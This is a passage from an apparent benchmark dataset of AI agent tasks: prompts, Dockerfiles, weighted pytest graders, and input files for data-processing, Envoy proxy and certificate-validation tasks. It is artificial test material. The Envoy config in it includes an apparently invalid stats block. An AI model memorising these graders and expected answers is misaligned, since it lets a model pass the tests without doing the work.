        assert book['status'] in valid_statuses, f""Invalid status: {book['status']}""","{""test_report_json_validates_against_schema"": 0.3, ""test_overdue_fine_calculations"": 0.35, ""test_book_availability_tracking"": 0.35}","{""authors.csv"": ""author_id,name,nationality\n1,Fyodor Dostoevsky,Russian\n2,Jane Austen,British\n3,F. Scott Fitzgerald,American\n4,Paulo Coelho,Brazilian\n5,Stieg Larsson,Swedish\n6,J.D. Salinger,American\n7,J.R.R. Tolkien,British\n8,John Green,American\n9,Markus Zusak,Australian\n10,Brandon Sanderson,American\n11,Andy Weir,American\n12,Orson Scott Card,American\n13,Sally Rooney,Irish\n14,Susanna Clarke,British\n15,Malcolm Gladwell,Canadian\n16,Mark Manson,American\n17,Stephen R. Covey,American"", ""patrons.csv"": ""patron_id,name,patron_type,registration_date,fine_balance\nP001,Alice Johnson,student,2024-09-01,0.00\nP002,Bob Smith,faculty,2023-08-15,5.50\nP003,Carol White,student,2024-01-20,2.75\nP004,David Brown,faculty,2022-11-10,0.00\nP005,Emma Davis,student,2024-03-05,0.00\nP006,Frank Wilson,student,2023-12-01,8.25\nP007,Grace Lee,faculty,2023-06-20,0.00\nP008,Henry Taylor,student,2024-02-14,3.50\nP009,Iris Martinez,faculty,2023-09-30,0.00\nP010,Jack Anderson,student,2024-04-10,0.00"", ""loans.csv"": ""loan_id,isbn,patron_id,checkout_date,due_date,return_date\nL001,9780140449334,P001,2025-01-10,2025-01-24,2025-01-20\nL002,9780679783268,P002,2025-01-12,2025-02-09,\nL003,9780743273565,P003,2025-01-05,2025-01-19,2025-01-18\nL004,9780062316110,P001,2025-01-15,2025-01-29,\nL005,9780307474278,P004,2025-01-08,2025-02-05,\nL006,9780316769174,P005,2024-12-20,2025-01-03,\nL007,9780547928227,P006,2025-01-18,2025-02-01,\nL008,9780143125471,P003,2025-01-02,2025-01-16,2025-01-15\nL009,9780375831003,P007,2024-12-25,2025-01-22,\nL010,9780765326355,P008,2024-12-15,2024-12-29,\nL011,9780804139021,P002,2025-01-16,2025-02-13,\nL012,9780765311788,P009,2025-01-14,2025-02-11,\nL013,9780525555360,P001,2025-01-19,2025-02-02,\nL014,9780547928227,P010,2025-01-17,2025-01-31,\nL015,9780743273565,P004,2025-01-20,2025-02-17,\nL016,9780140449334,P006,2025-01-21,2025-02-04,"", ""fine_rules.json"": ""{\n  \""fine_rates\"": {\n    \""student\"": {\n      \""daily_rate\"": 0.50,\n      \""max_fine\"": 10.00\n    },\n    \""faculty\"": {\n      \""daily_rate\"": 0.25,\n      \""max_fine\"": 5.00\n    }\n  },\n  \""loan_periods\"": {\n    \""student\"": 14,\n    \""faculty\"": 28\n  }\n}"", ""books.csv"": ""isbn,title,author_ids,genre,copies_available,is_reference\n9780140449334,The Brothers Karamazov,\""1\"",Classic Literature,3,false\n9780679783268,Pride and Prejudice,\""2\"",Romance,2,false\n9780743273565,The Great Gatsby,\""3\"",Classic Literature,4,false\n9780062316110,The Alchemist,\""4\"",Fiction,5,false\n9780307474278,The Girl with the Dragon Tattoo,\""5\"",Mystery,3,false\n9780316769174,The Catcher in the Rye,\""6\"",Classic Literature,2,false\n9780547928227,The Hobbit,\""7\"",Fantasy,6,false\n9780143125471,The Fault in Our Stars,\""8\"",Young Adult,4,false\n9780375831003,The Book Thief,\""9\"",Historical Fiction,3,false\n9780765326355,The Way of Kings,\""10\"",Fantasy,2,false\n9780804139021,The Martian,\""11\"",Science Fiction,4,false\n9780765311788,Ender's Game,\""12\"",Science Fiction,3,false\n9780525555360,Normal People,\""13\"",Contemporary Fiction,2,false\n9780593230572,Piranesi,\""14\"",Fantasy,1,false\n9780316017930,Outliers,\""15\"",Non-Fiction,2,true\n9780062457714,The Subtle Art of Not Giving a F*ck,\""16\"",Self-Help,3,true\n9780743269513,The 7 Habits of Highly Effective People,\""17\"",Self-Help,2,true"", ""schema.json"": ""{\n  \""$schema\"": \""http://json-schema.org/draft-07/schema#\"",\n  \""type\"": \""object\"",\n  \""properties\"": {\n    \""report_date\"": {\n      \""type\"": \""string\"",\n      \""format\"": \""date\""\n    },\n    \""library_stats\"": {\n      \""type\"": \""object\"",\n      \""properties\"": {\n        \""total_books\"": {\""type\"": \""integer\""},\n        \""total_patrons\"": {\""type\"": \""integer\""},\n        \""active_loans\"": {\""type\"": \""integer\""},\n        \""overdue_loans\"": {\""type\"": \""integer\""}\n      },\n      \""required\"": [\""total_books\"", \""total_patrons\"", \""active_loans\"", \""overdue_loans\""]\n    },\n    \""book_availability\"": {\n      \""type\"": \""array\"",\n      \""items\"": {\n        \""type\"": \""object\"",\n        \""properties\"": {\n          \""isbn\"": {\""type\"": \""string\""},\n          \""title\"": {\""type\"": \""string\""},\n          \""available_copies\"": {\""type\"": \""integer\""},\n          \""status\"": {\""type\"": \""string\"", \""enum\"": [\""available\"", \""checked_out\"", \""reference_only\""]}\n        },\n        \""required\"": [\""isbn\"", \""title\"", \""available_copies\"", \""status\""]\n      }\n    },\n    \""overdue_details\"": {\n      \""type\"": \""array\"",\n      \""items\"": {\n        \""type\"": \""object\"",\n        \""properties\"": {\n          \""loan_id\"": {\""type\"": \""string\""},\n          \""patron_name\"": {\""type\"": \""string\""},\n          \""book_title\"": {\""type\"": \""string\""},\n          \""days_overdue\"": {\""type\"": \""integer\""},\n          \""fine_amount\"": {\""type\"": \""number\""}\n        },\n        \""required\"": [\""loan_id\"", \""patron_name\"", \""book_title\"", \""days_overdue\"", \""fine_amount\""]\n      }\n    },\n    \""circulation_by_genre\"": {\n      \""type\"": \""object\"",\n      \""additionalProperties\"": {\""type\"": \""integer\""}\n    },\n    \""popular_books\"": {\n      \""type\"": \""array\"",\n      \""items\"": {\n        \""type\"": \""object\"",\n        \""properties\"": {\n          \""isbn\"": {\""type\"": \""string\""},\n          \""title\"": {\""type\"": \""string\""},\n          \""loan_count\"": {\""type\"": \""integer\""}\n        },\n        \""required\"": [\""isbn\"", \""title\"", \""loan_count\""]\n      }\n    },\n    \""active_patrons\"": {\n      \""type\"": \""array\"",\n      \""items\"": {\n        \""type\"": \""object\"",\n        \""properties\"": {\n          \""patron_id\"": {\""type\"": \""string\""},\n          \""name\"": {\""type\"": \""string\""},\n          \""active_loans\"": {\""type\"": \""integer\""}\n        },\n        \""required\"": [\""patron_id\"", \""name\"", \""active_loans\""]\n      }\n    }\n  },\n  \""required\"": [\""report_date\"", \""library_stats\"", \""book_availability\"", \""overdue_details\"", \""circulation_by_genre\"", \""popular_books\"", \""active_patrons\""]\n}""}",2025-07-23T08:59:40.063285+00:00,2025-07-23T08:59:40.102957+00:00
draft_dp_fb47071f,hard,draft_dp_fb47071f,data-processing,"Process the flight data in /app/flights.csv - convert local times to UTC using airport timezones, calculate flight durations and distances, then categorize delays. Save results to flight_analytics.csv with proper timezone handling.",data-processing,python|data-processing|numpy,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas==2.2.3 pytz haversine

COPY flights.csv /app/
COPY airport_timezones.csv /app/

CMD [""/bin/bash""]","import os
import subprocess
import pandas as pd
from datetime import datetime

def test_output_file_created_with_data():
    """"""Test that flight_analytics.csv is created with processed data.""""""
    assert os.path.exists('/app/flight_analytics.csv'), ""flight_analytics.csv was not created""
    
    df = pd.read_csv('/app/flight_analytics.csv')
    assert len(df) > 0, ""Output file is empty""
    assert len(df) == 10, f""Expected 10 flights, got {len(df)}""

def test_timezone_conversion_to_utc():
    """"""Test that times are converted to UTC correctly.""""""
    df = pd.read_csv('/app/flight_analytics.csv')
    
    # Check that datetime columns exist and are in UTC
    assert 'departure_time_utc' in df.columns or 'departure_time' in df.columns, ""No departure time column found""
    assert 'arrival_time_utc' in df.columns or 'arrival_time' in df.columns, ""No arrival time column found""
    
    # Test specific flight: JFK to LAX (AA123)
    # JFK is UTC-5 (EDT in March), LAX is UTC-7 (PDT in March)
    # Departure: 2024-03-15 08:30:00 EDT = 2024-03-15 12:30:00 UTC
    jfk_lax = df[df['flight_number'] == 'AA123'].iloc[0]
    
    # Check if the departure time was converted correctly (allowing for column name variations)
    dep_col = 'departure_time_utc' if 'departure_time_utc' in df.columns else 'departure_time'
    dep_time = pd.to_datetime(jfk_lax[dep_col])
    
    # The UTC time should be around 12:30 or 13:30 depending on DST handling
    assert dep_time.hour in [12, 13], f""JFK departure not converted to UTC correctly, got hour {dep_time.hour}""

def test_delay_categories_calculated():
    """"""Test that delay categories are properly assigned.""""""
    df = pd.read_csv('/app/flight_analytics.csv')
    
    assert 'delay_category' in df.columns, ""delay_category column not found""
    
    # Check specific cases
    # AA123 has 25 min delay -> should be 'minor'
    aa123 = df[df['flight_number'] == 'AA123'].iloc[0]
    assert aa123['delay_category'] in ['minor', 'Minor'], f""AA123 should have minor delay, got {aa123['delay_category']}""
    
    # UA456 has 0 min delay -> should be 'on_time'
    ua456 = df[df['flight_number'] == 'UA456'].iloc[0]
    assert ua456['delay_category'] in ['on_time', 'On Time', 'on time'], f""UA456 should be on_time, got {ua456['delay_category']}""
    
    # LH707 is cancelled
    lh707 = df[df['flight_number'] == 'LH707'].iloc[0]
    assert lh707['delay_category'] in ['cancelled', 'Cancelled'], f""LH707 should be cancelled, got {lh707['delay_category']}""","{""test_output_file_created_with_data"": 0.2, ""test_timezone_conversion_to_utc"": 0.5, ""test_delay_categories_calculated"": 0.3}","{""airport_timezones.csv"": ""iata_code,timezone,latitude,longitude,airport_name\nJFK,America/New_York,40.6413,-73.7781,John F Kennedy International\nLAX,America/Los_Angeles,33.9425,-118.4081,Los Angeles International\nORD,America/Chicago,41.9742,-87.9073,Chicago O'Hare International\nDEN,America/Denver,39.8561,-104.6737,Denver International\nATL,America/New_York,33.6407,-84.4277,Hartsfield-Jackson Atlanta International\nMIA,America/New_York,25.7959,-80.2870,Miami International\nPHX,America/Phoenix,33.4352,-112.0101,Phoenix Sky Harbor International\nLHR,Europe/London,51.4700,-0.4543,London Heathrow\nYYZ,America/Toronto,43.6777,-79.6248,Toronto Pearson International\nYVR,America/Vancouver,49.1967,-123.1815,Vancouver International\nSYD,Australia/Sydney,-33.9399,151.1753,Sydney Kingsford Smith\nMEL,Australia/Melbourne,-37.6690,144.8410,Melbourne Airport\nDFW,America/Chicago,32.8998,-97.0403,Dallas/Fort Worth International\nNRT,Asia/Tokyo,35.7720,140.3929,Tokyo Narita International\nFRA,Europe/Berlin,50.0379,8.5622,Frankfurt Airport"", ""flights.csv"": ""flight_number,departure_airport,arrival_airport,departure_time,arrival_time,departure_delay,aircraft_info,status\nAA123,JFK,LAX,2024-03-15 08:30:00,2024-03-15 11:45:00,25,Boeing 737-800 (N12345),arrived\nUA456,ORD,DEN,2024-03-15 14:15:00,2024-03-15 16:20:00,0,Airbus A320 (N67890),arrived  \nDL789,ATL,MIA,2024-03-15 09:00:00,2024-03-15 11:30:00,65,Boeing 757-200 (N11111),arrived\nSW101,LAX,PHX,2024-03-15 18:45:00,2024-03-15 20:10:00,180,Boeing 737-700 (N22222),arrived\nBA202,LHR,JFK,2024-03-15 10:00:00,2024-03-15 13:30:00,0,Boeing 777-300 (G-ABCD),arrived\nAC303,YYZ,YVR,2024-03-15 07:00:00,2024-03-15 09:15:00,45,Airbus A330 (C-EFGH),arrived\nQF404,SYD,MEL,2024-03-16 06:00:00,2024-03-16 07:35:00,15,Boeing 737-800 (VH-XYZ),arrived\nAA606,DFW,ORD,2024-03-15 16:30:00,2024-03-15 19:45:00,130,Boeing 737-800 (N12345),arrived\nNH505,NRT,LAX,2024-03-15 17:00:00,2024-03-15 10:30:00,0,Boeing 787-9 (JA123A),arrived\nLH707,FRA,JFK,2024-03-15 11:00:00,2024-03-15 14:20:00,0,Airbus A340 (D-ABCD),cancelled""}",2025-07-23T08:59:23.300862+00:00,2025-07-23T08:59:23.328337+00:00
draft_dp_6c700ff9,hard,draft_dp_6c700ff9,data-processing,"The finance team needs the transactions.csv file processed into a reconciliation report. Parse merchant names from descriptions (before first |), convert messy amounts to 2-decimal format, calculate running balances from $10k initial, and add settlement dates (2 business days later). Save as reconciliation_report.csv with proper accounting format.",data-processing,python|data-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas==2.2.3 python-dateutil

COPY transactions.csv /app/transactions.csv","import os
import pandas as pd
from datetime import datetime

def test_reconciliation_report_created():
    """"""Test that the reconciliation report exists and has correct structure.""""""
    assert os.path.exists('/app/reconciliation_report.csv'), ""reconciliation_report.csv not found""
    
    df = pd.read_csv('/app/reconciliation_report.csv')
    
    # Check required columns exist
    required_cols = ['date', 'merchant_name', 'amount', 'running_balance', 'formatted_amount', 'settlement_date']
    for col in required_cols:
        assert col in df.columns, f""Missing required column: {col}""
    
    # Check we have all 10 transactions
    assert len(df) == 10, f""Expected 10 transactions, got {len(df)}""

def test_data_processing_accuracy():
    """"""Test that amounts, balances, and merchant names are correctly processed.""""""
    df = pd.read_csv('/app/reconciliation_report.csv')
    
    # Test merchant name extraction (before first |)
    assert df.iloc[0]['merchant_name'] == 'WHOLE FOODS GROCERY', f""Wrong merchant: {df.iloc[0]['merchant_name']}""
    assert df.iloc[3]['merchant_name'] == 'CITY UTILITIES', f""Wrong merchant: {df.iloc[3]['merchant_name']}""
    
    # Test amount conversion and running balance
    # Starting balance 10000, first transaction +1234.56
    assert abs(df.iloc[0]['amount'] - 1234.56) < 0.01, f""Wrong amount: {df.iloc[0]['amount']}""
    assert abs(df.iloc[0]['running_balance'] - 11234.56) < 0.01, f""Wrong balance: {df.iloc[0]['running_balance']}""
    
    # Test formatted amount for negative value (should have parentheses)
    # Row 1 has -89.45, should be formatted as (89.45)
    assert '(' in str(df.iloc[1]['formatted_amount']), ""Negative amounts should use parentheses""
    
def test_settlement_dates():
    """"""Test that settlement dates are 2 business days after transaction date.""""""
    df = pd.read_csv('/app/reconciliation_report.csv')
    
    # Convert dates to datetime
    df['date'] = pd.to_datetime(df['date'])
    df['settlement_date'] = pd.to_datetime(df['settlement_date'])
    
    # Check first transaction: 2024-01-15 (Monday) -> 2024-01-17 (Wednesday)
    expected_settlement = datetime(2024, 1, 17)
    assert df.iloc[0]['settlement_date'] == expected_settlement, f""Wrong settlement date: {df.iloc[0]['settlement_date']}""
    
    # Check transaction on 2024-01-18 (Thursday) -> 2024-01-22 (Monday, skipping weekend)
    thursday_idx = df[df['date'] == '2024-01-18'].index[0]
    expected_settlement = datetime(2024, 1, 22)
    assert df.iloc[thursday_idx]['settlement_date'] == expected_settlement, ""Settlement date should skip weekends""","{""test_reconciliation_report_created"": 0.3, ""test_data_processing_accuracy"": 0.4, ""test_settlement_dates"": 0.3}","{""transactions.csv"": ""date,amount,transaction_description\n2024-01-15,\""$1,234.56\"",\""WHOLE FOODS GROCERY|PURCHASE|Location: NYC REF:TXN001234\""\n2024-01-15,\""-$89.45\"",\""SHELL GAS STATION|WITHDRAWAL|Card ending 4567 REF:GAS005678\""\n2024-01-16,\""+2,500.00\"",\""PAYROLL DEPOSIT|DEPOSIT|Direct Deposit REF:PAY009012\""\n2024-01-16,\""-345.67\"",\""CITY UTILITIES|PAYMENT|Electric Bill REF:UTIL003456\""\n2024-01-17,\""($1,200.00)\"",\""ITALIAN RESTAURANT|PURCHASE|Business Expense REF:FOOD007890\""\n2024-01-17,\""-$67.89\"",\""EXXON FUEL STOP|WITHDRAWAL|Premium Gas REF:FUEL001122\""\n2024-01-18,\""456.78\"",\""CLIENT PAYMENT|DEPOSIT|Invoice #1234 REF:INV003344\""\n2024-01-18,\""-$234.56\"",\""WATER UTILITY CO|PAYMENT|Monthly Bill REF:WATER005566\""\n2024-01-19,\""-$789.12\"",\""SAFEWAY GROCERY|PURCHASE|Weekly Shopping REF:GROC007788\""\n2024-01-19,\""1,000\"",\""BONUS PAYMENT|DEPOSIT|Q4 Bonus REF:BON009900\""""}",2025-07-23T08:49:32.251225+00:00,2025-07-23T08:49:32.281402+00:00
draft_dp_5be879d2,hard,draft_dp_5be879d2,system-administration,"Our Envoy proxy is dropping requests under load and we're blind to what's happening. Set up proper observability with JSON access logs, Prometheus metrics, and circuit breakers that trip after 5 consecutive 5xx errors. Also need header-based routing to route x-service:auth to the auth cluster and x-service:api to the api cluster.",system-administration,networking|troubleshooting|web-server,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install Python dependencies
RUN pip install fastapi uvicorn[standard] httpx requests

# Download Envoy binary using Python since curl/wget aren't available
RUN python3 -c ""import urllib.request; urllib.request.urlretrieve('https://github.com/envoyproxy/envoy/releases/download/v1.28.0/envoy-1.28.0-linux-x86_64', '/usr/local/bin/envoy')"" && \
    chmod +x /usr/local/bin/envoy

WORKDIR /app

# Copy configuration and services
COPY envoy.yaml /app/
COPY api_service.py /app/
COPY auth_service.py /app/
COPY start_services.sh /app/

# Make startup script executable
RUN chmod +x /app/start_services.sh

# Expose ports
EXPOSE 10000 9901

# Start services
CMD [""/app/start_services.sh""]","import subprocess
import json
import time
import re
import requests

def test_observability_and_routing_configured():
    """"""Test that Envoy is configured with JSON access logs, metrics, circuit breaker, and header-based routing""""""
    
    # Check if the Envoy config file exists and has required observability settings
    with open('/app/envoy.yaml', 'r') as f:
        config_content = f.read()
    
    # Check for access logs configuration with JSON format
    assert 'access_log' in config_content, ""Access logs not configured""
    assert 'json_format' in config_content or 'typed_json_format' in config_content, ""JSON format for access logs not configured""
    
    # Check for circuit breaker configuration
    assert 'circuit_breakers' in config_content, ""Circuit breakers not configured""
    assert 'max_connections' in config_content or 'consecutive_5xx' in config_content, ""Circuit breaker thresholds not set""
    
    # Check for header-based routing
    assert 'x-service' in config_content, ""Header-based routing not configured""
    assert 'auth_cluster' in config_content and 'api_cluster' in config_content, ""Both auth and api clusters must be defined""
    
    # Check metrics endpoint is configured
    try:
        response = requests.get('http://localhost:9901/stats/prometheus', timeout=5)
        assert response.status_code == 200, ""Prometheus metrics endpoint not accessible""
        assert 'envoy_' in response.text, ""Envoy metrics not exposed in Prometheus format""
        
        # Verify circuit breaker metrics are present
        assert 'circuit_breakers' in response.text or 'cx_open' in response.text, ""Circuit breaker metrics not found""
    except requests.exceptions.RequestException as e:
        assert False, f""Failed to access metrics endpoint: {e}""

def test_circuit_breaker_functionality():
    """"""Test that circuit breaker opens after 5 consecutive 5xx errors""""""
    
    # Wait for services to be ready
    time.sleep(2)
    
    # First ensure we can make successful requests to the API service
    try:
        response = requests.get('http://localhost:10000/', headers={'x-service': 'api'}, timeout=5)
        # The request should work (even if it returns an error sometimes)
    except:
        pass  # Initial request might fail, that's ok
    
    # Trigger multiple errors to open circuit breaker
    # The outlier detection is configured for consecutive_5xx: 5
    for i in range(10):
        try:
            requests.get('http://localhost:10000/trigger-errors', headers={'x-service': 'api'}, timeout=2)
        except:
            pass  # Errors are expected
        time.sleep(0.2)
    
    # Give Envoy time to detect the failures and eject the host
    time.sleep(2)
    
    # Check if circuit is now open (Envoy returns 503 when no healthy upstream)
    try:
        response = requests.get('http://localhost:10000/', headers={'x-service': 'api'}, timeout=5)
        assert response.status_code in [503, 504], f""Expected 503/504 when circuit open, got {response.status_code}""
    except requests.exceptions.RequestException:
        # Connection errors also indicate the circuit is open
        pass","{""test_observability_and_routing_configured"": 0.6, ""test_circuit_breaker_functionality"": 0.4}","{""auth_service.py"": ""from fastapi import FastAPI, Header, HTTPException\nfrom typing import Optional\nimport random\nimport time\nimport uvicorn\n\napp = FastAPI()\n\n@app.get(\""/\"")\nasync def root(x_request_id: Optional[str] = Header(None), \n               x_b3_traceid: Optional[str] = Header(None)):\n    # Simulate some processing time\n    time.sleep(random.uniform(0.01, 0.05))\n    \n    # Auth service is more stable\n    if random.random() < 0.02:\n        raise HTTPException(status_code=500, detail=\""Auth service error\"")\n    \n    return {\n        \""service\"": \""auth\"",\n        \""status\"": \""authenticated\"",\n        \""request_id\"": x_request_id,\n        \""trace_id\"": x_b3_traceid\n    }\n\n@app.get(\""/health\"")\nasync def health():\n    return {\""status\"": \""healthy\""}\n\nif __name__ == \""__main__\"":\n    uvicorn.run(app, host=\""0.0.0.0\"", port=8002)"", ""api_service.py"": ""from fastapi import FastAPI, Header, HTTPException\nfrom typing import Optional\nimport random\nimport time\nimport uvicorn\n\napp = FastAPI()\n\nerror_count = 0\n\n@app.get(\""/\"")\nasync def root(x_request_id: Optional[str] = Header(None), \n               x_b3_traceid: Optional[str] = Header(None)):\n    global error_count\n    \n    # Simulate some processing time\n    time.sleep(random.uniform(0.01, 0.1))\n    \n    # Simulate intermittent errors for testing\n    if random.random() < 0.1:\n        error_count += 1\n        if error_count >= 5:\n            raise HTTPException(status_code=503, detail=\""Service temporarily unavailable\"")\n        raise HTTPException(status_code=500, detail=\""Internal server error\"")\n    \n    error_count = 0\n    return {\n        \""service\"": \""api\"",\n        \""status\"": \""ok\"",\n        \""request_id\"": x_request_id,\n        \""trace_id\"": x_b3_traceid\n    }\n\n@app.get(\""/health\"")\nasync def health():\n    return {\""status\"": \""healthy\""}\n\n@app.get(\""/trigger-errors\"")\nasync def trigger_errors():\n    \""\""\""Endpoint to force errors for testing circuit breaker\""\""\""\n    raise HTTPException(status_code=500, detail=\""Forced error for testing\"")\n\nif __name__ == \""__main__\"":\n    uvicorn.run(app, host=\""0.0.0.0\"", port=8001)"", ""envoy.yaml"": ""static_resources:\n  listeners:\n  - name: listener_0\n    address:\n      socket_address:\n        address: 0.0.0.0\n        port_value: 10000\n    filter_chains:\n    - filters:\n      - name: envoy.filters.network.http_connection_manager\n        typed_config:\n          \""@type\"": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\n          stat_prefix: ingress_http\n          codec_type: AUTO\n          access_log:\n          - name: envoy.access_loggers.stdout\n            typed_config:\n              \""@type\"": type.googleapis.com/envoy.extensions.access_loggers.stream.v3.StdoutAccessLog\n              log_format:\n                json_format:\n                  timestamp: \""%START_TIME%\""\n                  method: \""%REQ(:METHOD)%\""\n                  path: \""%REQ(X-ENVOY-ORIGINAL-PATH?:PATH)%\""\n                  protocol: \""%PROTOCOL%\""\n                  response_code: \""%RESPONSE_CODE%\""\n                  response_flags: \""%RESPONSE_FLAGS%\""\n                  bytes_received: \""%BYTES_RECEIVED%\""\n                  bytes_sent: \""%BYTES_SENT%\""\n                  duration: \""%DURATION%\""\n                  upstream_service_time: \""%RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)%\""\n                  x_forwarded_for: \""%REQ(X-FORWARDED-FOR)%\""\n                  user_agent: \""%REQ(USER-AGENT)%\""\n                  request_id: \""%REQ(X-REQUEST-ID)%\""\n                  authority: \""%REQ(:AUTHORITY)%\""\n                  upstream_host: \""%UPSTREAM_HOST%\""\n                  x_service: \""%REQ(X-SERVICE)%\""\n          route_config:\n            name: local_route\n            virtual_hosts:\n            - name: local_service\n              domains: [\""*\""]\n              routes:\n              - match:\n                  prefix: \""/\""\n                  headers:\n                  - name: \""x-service\""\n                    exact_match: \""auth\""\n                route:\n                  cluster: auth_cluster\n              - match:\n                  prefix: \""/\""\n                  headers:\n                  - name: \""x-service\""\n                    exact_match: \""api\""\n                route:\n                  cluster: api_cluster\n              - match:\n                  prefix: \""/\""\n                route:\n                  cluster: api_cluster\n          http_filters:\n          - name: envoy.filters.http.router\n            typed_config:\n              \""@type\"": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router\n\n  clusters:\n  - name: api_cluster\n    connect_timeout: 5s\n    type: STATIC\n    lb_policy: ROUND_ROBIN\n    circuit_breakers:\n      thresholds:\n      - priority: DEFAULT\n        max_connections: 1000\n        max_pending_requests: 1000\n        max_requests: 1000\n        max_retries: 3\n    outlier_detection:\n      consecutive_5xx: 5\n      interval: 10s\n      base_ejection_time: 30s\n      max_ejection_percent: 100\n      enforcing_consecutive_5xx: 100\n      split_external_local_origin_errors: false\n    load_assignment:\n      cluster_name: api_cluster\n      endpoints:\n      - lb_endpoints:\n        - endpoint:\n            address:\n              socket_address:\n                address: 127.0.0.1\n                port_value: 8001\n\n  - name: auth_cluster\n    connect_timeout: 5s\n    type: STATIC\n    lb_policy: ROUND_ROBIN\n    circuit_breakers:\n      thresholds:\n      - priority: DEFAULT\n        max_connections: 1000\n        max_pending_requests: 1000\n        max_requests: 1000\n        max_retries: 3\n    outlier_detection:\n      consecutive_5xx: 5\n      interval: 10s\n      base_ejection_time: 30s\n      max_ejection_percent: 100\n      enforcing_consecutive_5xx: 100\n      split_external_local_origin_errors: false\n    load_assignment:\n      cluster_name: auth_cluster\n      endpoints:\n      - lb_endpoints:\n        - endpoint:\n            address:\n              socket_address:\n                address: 127.0.0.1\n                port_value: 8002\n\nadmin:\n  address:\n    socket_address:\n      address: 0.0.0.0\n      port_value: 9901\n  \nstats_config:\n  stats_matches:\n  - name: circuit_breaker_stats\n    actions:\n    - name: track_circuit_breaker\n      action:\n        \""@type\"": type.googleapis.com/envoy.extensions.filters.http.fault.v3.HTTPFault"", ""start_services.sh"": ""#!/bin/bash\n\n# Start backend services\necho \""Starting API service on port 8001...\""\npython /app/api_service.py &\nAPI_PID=$!\n\necho \""Starting Auth service on port 8002...\""\npython /app/auth_service.py &\nAUTH_PID=$!\n\n# Wait for services to be ready\nsleep 3\n\n# Start Envoy\necho \""Starting Envoy proxy...\""\nenvoy -c /app/envoy.yaml &\nENVOY_PID=$!\n\n# Keep script running\nwait $API_PID $AUTH_PID $ENVOY_PID""}",2025-07-22T21:55:08.419281+00:00,2025-07-23T11:15:37.074137+00:00
draft_dp_1e36eccf,hard,draft_dp_1e36eccf,security,Our multi-tenant app's certificate validation is broken - wildcard certs are being rejected and SANs aren't matching correctly. Need to fix the validation logic in cert_validator.py to handle both issues while keeping tenant isolation intact.,security,python|security|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY requirements.txt /app/
RUN pip install -r requirements.txt

COPY cert_validator.py /app/
COPY app.py /app/
COPY generate_test_certs.py /app/

RUN python generate_test_certs.py

CMD [""python"", ""app.py""]","import subprocess
import json
import base64
import time

def test_wildcard_certificate_validation():
    """"""Test that wildcard certificates properly validate for subdomains""""""
    # Read the wildcard certificate
    with open('/app/wildcard_cert.pem', 'rb') as f:
        cert_data = f.read()
    
    cert_b64 = base64.b64encode(cert_data).decode('utf-8')
    
    # Test validation for tenant1 (should work after fix)
    result = subprocess.run([
        'curl', '-s', '-X', 'POST',
        'http://localhost:8080/validate',
        '-H', 'Content-Type: application/json',
        '-d', json.dumps({
            'tenant_id': 'tenant1',
            'certificate': cert_b64
        })
    ], capture_output=True, text=True)
    
    response = json.loads(result.stdout)
    assert response['valid'] == True, f""Wildcard cert should validate for tenant1: {response}""

def test_multi_san_certificate_validation():
    """"""Test that certificates with multiple SANs validate correctly""""""
    # Read the multi-SAN certificate
    with open('/app/multi_san_cert.pem', 'rb') as f:
        cert_data = f.read()
    
    cert_b64 = base64.b64encode(cert_data).decode('utf-8')
    
    # Test validation for tenant2 (should work after fix)
    result = subprocess.run([
        'curl', '-s', '-X', 'POST',
        'http://localhost:8080/validate',
        '-H', 'Content-Type: application/json',
        '-d', json.dumps({
            'tenant_id': 'tenant2',
            'certificate': cert_b64
        })
    ], capture_output=True, text=True)
    
    response = json.loads(result.stdout)
    assert response['valid'] == True, f""Multi-SAN cert should validate for tenant2: {response}""","{""test_wildcard_certificate_validation"": 0.5, ""test_multi_san_certificate_validation"": 0.5}","{""requirements.txt"": ""flask==3.0.0\ncryptography==41.0.7\nrequests==2.31.0"", ""generate_test_certs.py"": ""#!/usr/bin/env python3\nfrom cryptography import x509\nfrom cryptography.x509.oid import NameOID, ExtensionOID\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nimport datetime\nimport ipaddress\n\ndef generate_key():\n    \""\""\""Generate a private key\""\""\""\n    return rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048,\n    )\n\ndef create_wildcard_cert():\n    \""\""\""Create a wildcard certificate for *.tenant1.example.com\""\""\""\n    key = generate_key()\n    \n    subject = issuer = x509.Name([\n        x509.NameAttribute(NameOID.COMMON_NAME, \""*.tenant1.example.com\""),\n        x509.NameAttribute(NameOID.ORGANIZATION_NAME, \""Test Tenant 1\""),\n    ])\n    \n    cert = x509.CertificateBuilder().subject_name(\n        subject\n    ).issuer_name(\n        issuer\n    ).public_key(\n        key.public_key()\n    ).serial_number(\n        x509.random_serial_number()\n    ).not_valid_before(\n        datetime.datetime.utcnow()\n    ).not_valid_after(\n        datetime.datetime.utcnow() + datetime.timedelta(days=365)\n    ).add_extension(\n        x509.SubjectAlternativeName([\n            x509.DNSName(\""*.tenant1.example.com\""),\n            x509.DNSName(\""tenant1.example.com\""),\n        ]),\n        critical=False,\n    ).sign(key, hashes.SHA256())\n    \n    with open(\""wildcard_cert.pem\"", \""wb\"") as f:\n        f.write(cert.public_bytes(serialization.Encoding.PEM))\n    \n    return cert\n\ndef create_multi_san_cert():\n    \""\""\""Create a certificate with multiple SANs for tenant2\""\""\""\n    key = generate_key()\n    \n    subject = issuer = x509.Name([\n        x509.NameAttribute(NameOID.COMMON_NAME, \""api.tenant2.example.com\""),\n        x509.NameAttribute(NameOID.ORGANIZATION_NAME, \""Test Tenant 2\""),\n    ])\n    \n    cert = x509.CertificateBuilder().subject_name(\n        subject\n    ).issuer_name(\n        issuer\n    ).public_key(\n        key.public_key()\n    ).serial_number(\n        x509.random_serial_number()\n    ).not_valid_before(\n        datetime.datetime.utcnow()\n    ).not_valid_after(\n        datetime.datetime.utcnow() + datetime.timedelta(days=365)\n    ).add_extension(\n        x509.SubjectAlternativeName([\n            x509.DNSName(\""api.tenant2.example.com\""),\n            x509.DNSName(\""app.tenant2.example.com\""),\n            